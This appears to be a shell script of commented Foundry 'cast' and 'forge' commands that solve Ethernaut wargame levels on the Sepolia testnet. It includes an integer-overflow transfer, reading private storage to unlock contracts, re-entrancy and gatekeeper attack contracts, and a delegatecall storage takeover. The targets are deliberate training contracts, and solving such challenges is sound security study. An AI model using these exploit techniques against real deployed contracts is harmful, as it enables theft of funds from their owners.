source .env

RPC_URL=https://eth-sepolia.public.blastapi.io

ADDRESS1=$(cast wallet address $PK)
ADDRESS2=$(cast wallet address $PK2)

#   _____     _      _______    
#  / ___/__  (_)__  / __/ (_)__ 
# / /__/ _ \/ / _ \/ _// / / _ \
# \___/\___/_/_//_/_/ /_/_/ .__/
#                        /_/    
#

# forge create src/CoinFlipWin.sol:CoinFlipWin --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast
# CoinFlipWin deployed, just call the win() function 10 times
# cast send 0x9bd8A6aEeDB750F4031FF8F2454c4f1C6F4784B9 "win()" --rpc-url $RPC_URL --private-key $PK


#  ______    __         __                
# /_  __/__ / /__ ___  / /  ___  ___  ___ 
#  / / / -_) / -_) _ \/ _ \/ _ \/ _ \/ -_)
# /_/  \__/_/\__/ .__/_//_/\___/_//_/\__/ 
#              /_/                        
#

# forge create src/Telephone.sol:Telephone --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast
# cast send 0x13b0Fd3E08298FB4B91ADC90ba268e829011574D "pwn()" --rpc-url $RPC_URL --private-key $PK

#  ______     __          
# /_  __/__  / /_____ ___ 
#  / / / _ \/  '_/ -_) _ \
# /_/  \___/_/\_\\__/_//_/
#                        

# send a big amount so it overflows
# cast send 0x2295A5987836fC03A7de9b5B031AB2Fcb9Ae2d3E "transfer(address,uint256)" 0x000000000000000000000000000000000000bEEF 1000000000000000000000000 --rpc-url $RPC_URL --private-key $PK

#    ___      __              __  _         
#   / _ \___ / /__ ___ ____ _/ /_(_)__  ___ 
#  / // / -_) / -_) _ `/ _ `/ __/ / _ \/ _ \
# /____/\__/_/\__/\_, /\_,_/\__/_/\___/_//_/
#                /___/                      

# cast send 0x3D18662b42aB2D58F5A20E1Ee6B0E0D0BE5102FE "0xdd365b8b" --rpc-url $RPC_URL --private-key $PK

#    ____                
#   / __/__  ___________ 
#  / _// _ \/ __/ __/ -_)
# /_/  \___/_/  \__/\__/ 
#                       

# forge create src/Force.sol:Force --value 1wei --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast

#   _   __          ____ 
#  | | / /__ ___ __/ / /_
#  | |/ / _ `/ // / / __/
#  |___/\_,_/\_,_/_/\__/ 
#                       

# Find the password with
# cast storage 0xBe38F249790be761b6B5a667dd11198935E27fB6 1 --rpc-url https://eth-sepolia.public.blastapi.io
# cast send 0xBe38F249790be761b6B5a667dd11198935E27fB6 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 --rpc-url $RPC_URL --private-key $PK

#    __ ___          
#   / //_(_)__  ___ _
#  / ,< / / _ \/ _ `/
# /_/|_/_/_//_/\_, / 
#             /___/  

# forge create src/King.sol:King --value 0.0011ether --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast

#    ___      ____     __                        
#   / _ \___ / __/__  / /________ ____  ______ __
#  / , _/ -_) _// _ \/ __/ __/ _ `/ _ \/ __/ // /
# /_/|_|\__/___/_//_/\__/_/  \_,_/_//_/\__/\_, / 
#                                         /___/  

# forge create src/ReEntrancy.sol:ReEntrancy --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast
# cast send 0x8c13F1e443580Cd31770595E20c9fffE18e3cab1 "pwn()" --value 0.001ether --rpc-url $RPC_URL --private-key $PK

#    ______              __          
#   / __/ /__ _  _____ _/ /____  ____
#  / _// / -_) |/ / _ `/ __/ _ \/ __/
# /___/_/\__/|___/\_,_/\__/\___/_/   
#                                   

# forge create src/Building.sol:Building --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast
# cast send 0x42e8e41f12BE19CF36023f7d0008963a95455485 "toLastFloor()" --rpc-url $RPC_URL --private-key $PK

#    ___      _                   
#   / _ \____(_)  _____ _______ __
#  / ___/ __/ / |/ / _ `/ __/ // /
# /_/  /_/ /_/|___/\_,_/\__/\_, / 
#                          /___/  
#

# cast storage 0x27A7D7b2cc916400E1E3da0095E561858c3C0958 5 --rpc-url $RPC_URL
# uint8 private flattening = 10;
# uint8 private denomination = 255;
# uint16 private awkwardness = uint16(block.timestamp);
# ^ they are all stored in the same slot 2
# cast send 0x27A7D7b2cc916400E1E3da0095E561858c3C0958 "unlock(bytes16)" 0x46cbd42863381d18c545fea905d76351 --rpc-url $RPC_URL --private-key $PK

#   _____     __      __                          ____          
#  / ___/__ _/ /____ / /_____ ___ ___  ___ ____  / __ \___  ___ 
# / (_ / _ `/ __/ -_)  '_/ -_) -_) _ \/ -_) __/ / /_/ / _ \/ -_)
# \___/\_,_/\__/\__/_/\_\\__/\__/ .__/\__/_/    \____/_//_/\__/ 
#                              /_/                              
#

# forge create src/GatekeeperOnePwn.sol:GatekeeperOnePwn --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast
# Check the GateKeeperOnePwn.t.sol - the while loop is used to "bruteforce" the right amount of gas
# cast send 0x1E7512843281952433E0c538a580bA3442133998 "pwn(uint256)" 24829 --rpc-url $RPC_URL --private-key $PK

#   _____     __      __                          ______          
#  / ___/__ _/ /____ / /_____ ___ ___  ___ ____  /_  __/    _____ 
# / (_ / _ `/ __/ -_)  '_/ -_) -_) _ \/ -_) __/   / / | |/|/ / _ \
# \___/\_,_/\__/\__/_/\_\\__/\__/ .__/\__/_/     /_/  |__,__/\___/
#                              /_/                                
#

# TODO:

#    _  __               __   __    _____     _    
#   / |/ /__ ___ _____ _/ /  / /_  / ___/__  (_)__ 
#  /    / _ `/ // / _ `/ _ \/ __/ / /__/ _ \/ / _ \
# /_/|_/\_,_/\_,_/\_, /_//_/\__/  \___/\___/_/_//_/
#                /___/                             

# you can create a wallet with: cast w n
# Approve another spender
# NAUGHT_COIN_ADDRESS=0x4A0f994712FB20860ED9275A3CFdA56Cd51311F5
# cast send $NAUGHT_COIN_ADDRESS "approve(address, uint256)" $ADDRESS2 $(cast max-uint) --rpc-url $RPC_URL --private-key $PK
# NAUGHT_COIN_BALANCE=$(cast call $NAUGHT_COIN_ADDRESS "balanceOf(address)" $ADDRESS1 --rpc-url $RPC_URL)
# cast send $ADDRESS2 --value 0.001ether --rpc-url $RPC_URL --private-key $PK
# cast send $NAUGHT_COIN_ADDRESS "transferFrom(address, address, uint256)" $ADDRESS1 $ADDRESS2 $NAUGHT_COIN_BALANCE --rpc-url $RPC_URL --private-key $PK2

#    ___                                __  _         
#   / _ \_______ ___ ___ _____  _____ _/ /_(_)__  ___ 
#  / ___/ __/ -_|_-</ -_) __/ |/ / _ `/ __/ / _ \/ _ \
# /_/  /_/  \__/___/\__/_/  |___/\_,_/\__/_/\___/_//_/
# 

# forge create src/Preservation.sol:Preservation --chain-id 11155111 --rpc-url $RPC_URL --private-key $PK --broadcast
# Deployed to: 0x51fF8fa9D082CB1b5f5D4A2aee88e46Bc03D57BB
# cast send 0x4a4F3D01757AAC5e4928C3E74C56fe60ce0CF6b0 "setSecondTime(uint256)" 0x00000000000000000000000051fF8fa9D082CB1b5f5D4A2aee88e46Bc03D57BB --rpc-url $RPC_URL --private-key $PK
# cast storage can be used to check storage
# cast send 0x4a4F3D01757AAC5e4928C3E74C56fe60ce0CF6b0 "setFirstTime(uint256)" 0x000000000000000000000000aaD6Ad90AdD13dD4f62A1b663B5d8C14F826cdF1 --rpc-url $RPC_URL --private-key $PK


# small slant is used to generate ascii images